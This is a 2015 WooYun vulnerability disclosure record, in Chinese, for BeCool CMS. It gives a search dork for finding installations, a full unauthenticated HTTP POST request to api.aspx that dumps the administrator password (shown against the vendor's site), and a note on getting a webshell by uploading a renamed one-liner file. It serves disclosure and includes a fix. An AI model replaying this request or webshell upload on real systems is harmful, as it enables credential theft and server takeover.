{"id": 39895, "wybug_id": "wooyun-2015-0104511", "wybug_title": "becoolcms设计缺陷直查管理员密码（官网getshell）", "wybug_corp": "贝一科技", "wybug_author": "GrayTrack", "wybug_date": "2015-04-02 11:06", "wybug_open_date": "2015-05-17 11:08", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["应用敏感信息泄漏", "信息未屏蔽"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-02：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-05-17：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： becoolcms敏感信息泄露，秒杀官网 详细说明：  首先来几张图，看看用户量。谷歌关键字：Powered by BeCool CMS\n\n\n\n\n\n   漏洞证明：  默认后台地址 www.xxx.com/becool/官网为例，post数据\nPOST http://www.becoolcms.com/BeCool/api.aspx HTTP/1.1Host: www.becoolcms.comUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: bdshare_firstime=1423234654320; Hm_lvt_c86e932f49ca6aab9ccf2d7603d18e21=1425188506,1426052010,1426055363,1427559239; Hm_lpvt_c86e932f49ca6aab9ccf2d7603d18e21=1427559239Connection: keep-aliveReferer: http://www.becoolcms.com/becool/becoolApp.swf/[[DYNAMIC]]/9Content-type: application/x-www-form-urlencodedContent-length: 145pageIndex=1&pageSize=10&conditions=%5B%5D&%5F%5F%5FfunctionName=BeCool%2EMember%2EUserControl%2EGetList&%5F%5F%5FaccessToken=null&orderbys=%5B%5D\n接下来可以看到意想不到的效果，后台的api函数直接调用数据库，我也是醉了，把管理员密码给查出来了，真实奇葩的程序猿。\n\n得到密码登录后台，后台随便上传一个txt文件，插一句话，右键重命名为aspx格式即可getshell。\n\n   修复方案：  禁用查询函数BeCool.Member.UserControl.GetList   版权声明：转载请注明来源 GrayTrack@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2015-05-17 16:26 |    \t\tElliott \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:9        | 绝逼不当程序员)\t\t \n  醉了，还有这接口    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}